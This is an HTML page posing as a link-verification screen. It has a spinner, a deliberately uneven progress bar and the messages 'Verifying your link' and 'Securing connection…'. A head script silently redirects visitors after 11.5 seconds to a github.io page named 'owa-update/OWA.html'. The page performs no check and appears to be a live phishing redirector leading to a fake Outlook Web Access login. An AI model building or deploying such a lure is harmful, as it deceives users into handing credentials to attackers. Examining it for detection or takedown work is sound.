
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying…</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #ffffff;
      color: #111111;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .container {
      max-width: 420px;
      padding: 0 24px;
      width: 100%;
    }

    .icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 40px auto;
      /* centered + good space below */
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .spinner {
      width: 80px;
      height: 80px;
      border: 5px solid #f0f0f0;
      border-top: 5px solid #0066ff;
      border-radius: 50%;
      animation: spin 1.4s cubic-bezier(0.65, 0, 0.55, 1) infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    h1 {
      font-size: 1.8rem;
      font-weight: 600;
      margin-bottom: 12px;
      color: #000000;
    }

    p {
      font-size: 1.05rem;
      line-height: 1.5;
      color: #444444;
      margin-bottom: 40px;
    }

    .progress-container {
      width: 100%;
      height: 6px;
      background: #f0f0f0;
      border-radius: 3px;
      overflow: hidden;
      margin-bottom: 16px;
    }

    .progress {
      height: 100%;
      width: 0%;
      background: #0066ff;
      border-radius: 3px;
      animation: progress 11s cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
    }

    @keyframes progress {
      0% {
        width: 0%;
      }

      25% {
        width: 45%;
      }

      60% {
        width: 58%;
      }

      72% {
        width: 52%;
      }

      92% {
        width: 94%;
      }

      100% {
        width: 100%;
      }
    }

    .status {
      font-size: 0.95rem;
      color: #666666;
    }
  </style>
  <script>
    setTimeout(() => {
      window.location.href = "https://cloud-sourcesketch.github.io/owa-update/OWA.html#";
    }, 11500);
  </script>
</head>

<body>

  <div class="container">
    <div class="icon">
      <div class="spinner"></div>
    </div>

    <h1>Verifying your link</h1>
    <p>Please wait a moment while we confirm your request. This should only take a few seconds.</p>

    <div class="progress-container">
      <div class="progress"></div>
    </div>

    <div class="status">Securing connection…</div>
  </div>

</body>

</html>
